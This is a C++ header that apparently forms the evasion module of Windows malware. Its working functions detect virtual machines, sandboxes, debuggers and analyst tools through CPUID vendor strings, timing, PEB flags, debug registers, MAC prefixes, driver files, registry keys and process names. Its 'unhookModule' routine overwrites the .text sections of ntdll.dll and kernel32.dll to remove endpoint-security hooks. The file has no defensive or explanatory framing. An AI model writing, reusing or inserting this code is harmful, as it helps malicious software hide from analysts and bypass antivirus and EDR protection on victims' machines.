#ifndef EVASION_H
#define EVASION_H

#include <windows.h>
#include <vector>
#include <string>
#include <chrono>
#include <thread>
#include <iphlpapi.h>
#include <intrin.h>
#include <tlhelp32.h>
#include <aclapi.h>
#include <algorithm>
#include <random>

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "advapi32.lib")

namespace Evasion {

// --- CPU & Timing Checks ---

// Checks for hypervisor presence via CPUID
inline bool checkCPUID() {
    int cpuInfo[4];
    __cpuid(cpuInfo, 1);
    bool hypervisorBit = (cpuInfo[2] >> 31) & 1;
    if (hypervisorBit) return true;

    __cpuid(cpuInfo, 0x40000000);
    char vendor[13];
    memcpy(vendor, &cpuInfo[1], 4);
    memcpy(vendor + 4, &cpuInfo[2], 4);
    memcpy(vendor + 8, &cpuInfo[3], 4);
    vendor[12] = '\0';
    std::string vendorStr(vendor);

    const std::vector<std::string> vmVendors = {
        "VMwareVMware", "Microsoft Hv", "KVMKVMKVM",
        "VBoxVBoxVBox", "XenVMMXenVMM", "prl hyperv"
    };

    for (const auto& vmVendor : vmVendors) {
        if (vendorStr.find(vmVendor) != std::string::npos) {
            return true;
        }
    }
    return false;
}

// Checks for debugger timing artifacts
inline bool checkTiming() {
    auto start = std::chrono::high_resolution_clock::now();
    for (volatile int i = 0; i < 100000; ++i) {}
    auto end = std::chrono::high_resolution_clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start).count();

    auto start2 = std::chrono::high_resolution_clock::now();
    std::this_thread::sleep_for(std::chrono::milliseconds(100));
    auto end2 = std::chrono::high_resolution_clock::now();
    auto sleep_duration = std::chrono::duration_cast<std::chrono::milliseconds>(end2 - start2).count();

    return duration > 100 || sleep_duration < 80;
}

// Checks for low RAM, common in sandboxes
inline bool checkRAM() {
    MEMORYSTATUSEX status;
    status.dwLength = sizeof(status);
    GlobalMemoryStatusEx(&status);
    return status.ullTotalPhys / (1024 * 1024) < 2048; // Less than 2GB RAM
}

// --- Debugger & System State Checks ---

inline bool checkIsDebuggerPresent() {
    return IsDebuggerPresent();
}

inline bool checkPEB() {
    #if defined(_WIN64)
        return *(BOOL*)((BYTE*)__readgsqword(0x60) + 2);
    #else
        return *(BOOL*)((BYTE*)__readfsdword(0x30) + 2);
    #endif
}

inline bool checkNtGlobalFlag() {
    DWORD ntGlobalFlag = 0;
    #if defined(_WIN64)
        ntGlobalFlag = *(DWORD*)(__readgsqword(0x60) + 0xBC);
    #else
        ntGlobalFlag = *(DWORD*)(__readfsdword(0x30) + 0x68);
    #endif
    return (ntGlobalFlag & 0x70) != 0;
}

inline bool checkHardwareBreakpoints() {
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (GetThreadContext(GetCurrentThread(), &ctx)) {
        return ctx.Dr0 != 0 || ctx.Dr1 != 0 || ctx.Dr2 != 0 || ctx.Dr3 != 0;
    }
    return false;
}

// --- Artifact Checks (Files, Registry, MAC) ---

inline bool checkMACAddress() {
    const std::vector<std::string> vmMacPrefixes = {
        "00:05:69", "00:0C:29", "00:1C:14", "00:50:56", // VMware
        "08:00:27", // VirtualBox
        "00:15:5D"  // Hyper-V
    };

    ULONG bufferSize = 0;
    if (GetAdaptersInfo(NULL, &bufferSize) != ERROR_BUFFER_OVERFLOW) return false;

    std::vector<BYTE> buffer(bufferSize);
    PIP_ADAPTER_INFO pAdapterInfo = reinterpret_cast<PIP_ADAPTER_INFO>(buffer.data());

    if (GetAdaptersInfo(pAdapterInfo, &bufferSize) == ERROR_SUCCESS) {
        while (pAdapterInfo) {
            char macAddr[18];
            sprintf_s(macAddr, sizeof(macAddr), "%02X:%02X:%02X:%02X:%02X:%02X",
                pAdapterInfo->Address[0], pAdapterInfo->Address[1], pAdapterInfo->Address[2],
                pAdapterInfo->Address[3], pAdapterInfo->Address[4], pAdapterInfo->Address[5]);

            std::string macStr(macAddr);
            for (const auto& prefix : vmMacPrefixes) {
                if (macStr.rfind(prefix, 0) == 0) return true;
            }
            pAdapterInfo = pAdapterInfo->Next;
        }
    }
    return false;
}

inline bool checkVMFiles() {
    char systemDir[MAX_PATH];
    GetSystemDirectoryA(systemDir, MAX_PATH);
    const std::vector<std::string> vmFiles = {
        std::string(systemDir) + "\\drivers\\VBoxMouse.sys",
        std::string(systemDir) + "\\drivers\\VBoxGuest.sys",
        std::string(systemDir) + "\\drivers\\vmhgfs.sys",
        std::string(systemDir) + "\\drivers\\vmmouse.sys"
    };

    for (const auto& file : vmFiles) {
        if (GetFileAttributesA(file.c_str()) != INVALID_FILE_ATTRIBUTES) return true;
    }
    return false;
}

inline bool checkVMRegistryKeys() {
    const std::vector<std::string> keys = {
        "HARDWARE\\ACPI\\DSDT\\VBOX__",
        "SOFTWARE\\Oracle\\VirtualBox Guest Additions",
        "SOFTWARE\\VMware, Inc.\\VMware Tools"
    };
    HKEY hKey;
    for (const auto& key : keys) {
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, key.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return true;
        }
    }
    return false;
}

inline bool checkRunningProcesses() {
    const std::vector<std::string> processNames = {
        "wireshark.exe", "ollydbg.exe", "procexp.exe", "idaq.exe", "idaq64.exe",
        "vmtoolsd.exe", "VBoxService.exe"
    };

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hSnapshot, &pe32)) {
        do {
            for (const auto& name : processNames) {
                if (_stricmp(pe32.szExeFile, name.c_str()) == 0) {
                    CloseHandle(hSnapshot);
                    return true;
                }
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return false;
}

// --- Active Defense ---

inline void unhookModule(const char* moduleName) {
    HMODULE hModule = GetModuleHandleA(moduleName);
    if (!hModule) return;

    char systemPath[MAX_PATH];
    GetSystemDirectoryA(systemPath, MAX_PATH);
    char dllPath[MAX_PATH];
    sprintf_s(dllPath, MAX_PATH, "%s\\%s", systemPath, moduleName);

    HANDLE hFile = CreateFileA(dllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;

    HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMapping) { CloseHandle(hFile); return; }

    LPVOID pMappedBase = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!pMappedBase) { CloseHandle(hMapping); CloseHandle(hFile); return; }

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);

    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)pSectionHeader->Name, ".text") == 0) {
            DWORD oldProtect;
            VirtualProtect((LPVOID)((BYTE*)hModule + pSectionHeader->VirtualAddress), pSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtect);
            memcpy((LPVOID)((BYTE*)hModule + pSectionHeader->VirtualAddress), (LPVOID)((BYTE*)pMappedBase + pSectionHeader->VirtualAddress), pSectionHeader->Misc.VirtualSize);
            VirtualProtect((LPVOID)((BYTE*)hModule + pSectionHeader->VirtualAddress), pSectionHeader->Misc.VirtualSize, oldProtect, &oldProtect);
            break;
        }
        pSectionHeader++;
    }

    UnmapViewOfFile(pMappedBase);
    CloseHandle(hMapping);
    CloseHandle(hFile);
}

inline void unhookCriticalAPIs() {
    unhookModule("ntdll.dll");
    unhookModule("kernel32.dll");
}

// --- Main Orchestrator ---

inline bool isAnalysisEnvironment() {
    std::vector<bool(*)()> checks = {
        checkCPUID,
        checkTiming,
        checkRAM,
        checkIsDebuggerPresent,
        checkPEB,
        checkNtGlobalFlag,
        checkHardwareBreakpoints,
        checkMACAddress,
        checkVMFiles,
        checkVMRegistryKeys,
        checkRunningProcesses
    };

    auto rd = std::random_device{};
    auto rng = std::default_random_engine{ rd() };
    std::shuffle(std::begin(checks), std::end(checks), rng);

    for (const auto& check : checks) {
        if (check()) return true;
    }
    return false;
}

} // namespace Evasion

#endif // EVASION_H